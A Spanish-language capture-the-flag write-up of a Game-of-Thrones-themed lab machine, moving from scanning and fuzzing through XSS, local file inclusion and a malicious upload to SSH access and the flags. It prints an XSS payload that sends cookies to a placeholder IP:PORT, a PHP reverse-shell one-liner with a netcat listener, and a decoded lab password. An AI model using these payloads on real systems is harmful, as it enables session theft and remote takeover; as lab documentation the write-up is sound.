
# Reto 4

## Paso 1

Luego de configurar la maquina e iniciarla esta mostraba la ip de la misma al cual le hicimos un escaneo con nmap.

Encontramos el puerto 80 con un servidor apache y ssh en el 22.

## Paso 2

con wfuzz buscamos rutas y encontramos las siguientes:

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================
                        
000004946:   200        19 L     66 W       665 Ch      "comentarios"                        
000009563:   200        31 L     118 W      964 Ch      "index"                              
000017880:   200        0 L      5 W        37 Ch       "test"
```

la ruta test no tenia nada interesante, pero comentarios e index si:

index.php

![Captura de pantalla -2024-05-20 21-23-52](https://github.com/halexys/UciTeam1/assets/72656657/ee703efd-eca9-4325-b369-1836d4c5be6c)


comentarios.php

![Captura de pantalla -2024-05-20 21-27-34](https://github.com/halexys/UciTeam1/assets/72656657/c1b5bf4e-53b5-4df3-87f0-b2547c2055dc)


Este ultimo tenia tres cosas interesantes.

- Establecia una cookie user con un valor aleatorio y la mostraba en el texto "Tu llave es:"
- un enlace "http://palaces.dorne.got"
- un formulario con un textarea para enviar un "comentario"

&nbsp;

## Paso 3

Analizamos la web y encontramos q era vulnerable a XSS, enviando una etiqueta html con un pequeño codigo javascript en el comentario

&nbsp;

el cual enviaba a un sevidor q poniamos en escucha con python las cookies.

```html
<script>document.write('<img src="http://IP:PORT/'+document.cookie+'"/> ')</script>
```

lo q devolvio:

![Captura de pantalla -2024-05-20 21-44-17](https://github.com/halexys/UciTeam1/assets/72656657/4ea0930f-e349-4171-a296-aea0a3e52cf0)


de aqui la cookie interesante era user=Unbowed,Unbent,Unbroken

## Paso 4

tras un rato de intentar cosas pusimos la url q aparecia en esta pagina en /etc/hosts

y abrio otra pagina:

![Captura de pantalla -2024-05-20 21-53-32](https://github.com/halexys/UciTeam1/assets/72656657/09259921-848e-4765-ad44-8b8c292e5f59)


no demoramos mucho en darnos cuenta q teniamos q establecer la cokie q devolvio el XSS y nos permitio "Acceso" y la primera flag:

flag: flag{j4rd1n-Alc4z4r}

![Captura de pantalla -2024-05-20 21-55-52](https://github.com/halexys/UciTeam1/assets/72656657/f088ff70-9224-4955-992c-cf477c44067b)


junto con la flag otra url la cual agregamos a hosts : http://don-pedro.dorne.got

## ![Captura de pantalla -2024-05-20 22-05-16](https://github.com/halexys/UciTeam1/assets/72656657/c9f8e020-79c5-434a-b5bd-ff4458cc681b)


&nbsp;

### PASO 5

al darle en cambiar idioma salio lo siguiente al final de la pagina:

![Captura de pantalla -2024-05-20 22-10-27](https://github.com/halexys/UciTeam1/assets/72656657/5ee2f7b1-30a6-451d-99bd-eab212ed410c)


Era bastante obvio el LFI(loca file inclusion) ya q al principio de cada linea estaban las letras LFI y directamente probamos con file=flag.txt (el texto era muy obvio) y luego con access.txt

![Captura de pantalla -2024-05-20 22-14-19](https://github.com/halexys/UciTeam1/assets/72656657/1bdb0ae5-194d-4c20-9ac1-6e22e8749224)


![Captura de pantalla -2024-05-20 22-15-46](https://github.com/halexys/UciTeam1/assets/72656657/d8035307-fe5c-41bf-8a1f-3da493dcd2e2)


una nueva url en el acces.txt y un usuario y contraseña?

![Captura de pantalla -2024-05-20 22-18-16](https://github.com/halexys/UciTeam1/assets/72656657/426ce299-4407-4717-9019-4c8c481a74e5)


al ingresar el usario y la contraseña sale lo siguiente:

![Captura de pantalla -2024-05-20 22-19-33](https://github.com/halexys/UciTeam1/assets/72656657/9949bcdc-79f8-4721-9d09-951114beb4ec)


## Paso 6

probamos subir un archivo cualquiera:

![Captura de pantalla -2024-05-20 22-22-06](https://github.com/halexys/UciTeam1/assets/72656657/6bf241d5-a8aa-47c0-80db-c0bdc997bdb1)


como dice q solo funcionara secret.sh probamos ejecutar un comando simple de bash

```bash
ls
```

y probamos con lfi en la ruta del palacio de don pedro:

![Captura de pantalla -2024-05-20 22-27-05](https://github.com/halexys/UciTeam1/assets/72656657/cb5e3da1-754e-42ae-91a8-99161e43b4ee)


&nbsp;

Funciona la ejecucion remota de comandos, y probamos una revershell en php

```php
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

y ponemos netcat en escucha:

```bash
nc -lnvp PORT
```

![Captura de pantalla -2024-05-20 22-32-17](https://github.com/halexys/UciTeam1/assets/72656657/4a2b0472-ab3e-487c-9e7d-cbb4a87ffcb3)

con la revershell navegamos por algunos directorios y encontros la 3ra flag en /home/www-data

![Captura de pantalla -2024-05-20 22-36-29](https://github.com/halexys/UciTeam1/assets/72656657/2c5df24c-faea-45bf-8cf6-cd45ed186728)



en /etc/passwd estaba el usuario doran y la contraseña en base64

```
doran:x:1001:1001:,,,,RDByNG4yMDI0Kgo=:/home/doran:/bin/bash
```

```
doran
D0r4n2024*
```

y luego accedimos por ssh

## Paso 7

dentro del directorio home del usuario doran habia lo siguiente:

```bash
doran@jnic2024:~$ ls
flag.txt  reto-final.txt
```

```bash
doran@jnic2024:~$ cat flag.txt 
No me fío de tu palabra, si no puedo confiar en ti, no podré entregarte la última flag
doran@jnic2024:~$
```

```bash
doran@jnic2024:~$ cat reto-final.txt 
Ya no tengo en nadie en quien confiar.

Voy a hacerte una ultima pregunta muy importante y necesito que me respondas con la verdad.

Dependiendo de tu respuesta, te dare o no la ultima flag.

Siento que alguien cercano a la familia, me va a traicionar, no se quien, pero necesito saberlo antes que sea tarde....

Podras decirme su nombre?: 

Respuesta: *******

Solo completa el nombre y te dire mi decision en el archivo flag.txt
doran@jnic2024:~$
```

Luego de googlear quien mato a doran martel encontramos q fue Ellaria y probamos reempalzar los asteriscos por Ellaria:

```bash
doran@jnic2024:~$ cat flag.txt 
Sabía que podía confiar en ti, antes de ser traicionado te entrego la última flag, cuida de Dorne!
flag{0=;;;D0rn3;;;>}
Felicidades!!! Reto D0rn3 Finalizado - Powered by j4ck 
doran@jnic2024:~$
```

&nbsp;

# FIN
